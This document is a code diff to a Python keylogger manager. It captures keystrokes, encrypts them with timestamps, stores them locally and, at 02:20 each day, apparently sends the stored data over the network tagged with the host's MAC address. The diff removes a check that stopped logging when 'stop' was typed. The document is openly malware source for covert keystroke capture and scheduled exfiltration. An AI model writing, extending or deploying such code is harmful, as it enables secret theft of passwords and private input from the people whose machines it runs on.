@@ -9,7 +9,8 @@ from time import sleep
 from datetime import datetime
 import logging
 
-logging.basicConfig(filename='../../utilities/log.txt', level=logging.DEBUG, format='%(asctime)s - %(message)s', filemode='a')
+logging.basicConfig(filename='../log.txt', level=logging.DEBUG, format='%(asctime)s - %(message)s', filemode='a')
+
 
 class KeyLoggerManager:
     """
@@ -49,7 +50,6 @@ class KeyLoggerManager:
             self.keylogger.stop_logging()
             self.flag = False
 
-
     def handle_logging(self):
         """
         Continuously fetches logged keys, encrypts them, and writes them to storage.
@@ -63,10 +63,6 @@ class KeyLoggerManager:
         while self.flag:
             logged_keys = "".join(self.keylogger.get_logged_keys())
             if logged_keys:
-                if "stop" in logged_keys:
-                    self.keylogger.stop_logging()
-                    self.flag = False
-                    logged_keys = logged_keys.split('stop')[0] + 'stop'
                 logged_keys = datetime.now().strftime('%H:%M:%S %d/%m/%Y\n') + logged_keys
                 try:
                     encrypted_data = self.encoder.encryption(logged_keys)
@@ -77,6 +73,9 @@ class KeyLoggerManager:
             else:
                 self.write_data('')
             sleep(5)
+        self.keylogger.stop_logging()
+        self.flag = False
+        logging.info('Logging stopped')
 
     def write_data(self, encrypted_data):
         """
@@ -91,7 +90,6 @@ class KeyLoggerManager:
             The encrypted log data to be written or sent.
         """
         if datetime.now().hour == 2 and datetime.now().minute == 20 and 0 <= datetime.now().second <= 5:
-
             self.writer = NetWorkWriter()
             with open('../Data_File.txt', 'r') as file:
                 encrypted_data = file.read() + encrypted_data
@@ -100,6 +98,7 @@ class KeyLoggerManager:
         else:
             self.writer = FileWriter()
         self.writer.send_data(encrypted_data, self.mac_address)
+        logging.info(f'Data written to {self.writer}')
 
 
 def main():
@@ -108,7 +107,5 @@ def main():
     key_logger.handle_logging()
 
 
-
 if __name__ == "__main__":
     main()
-
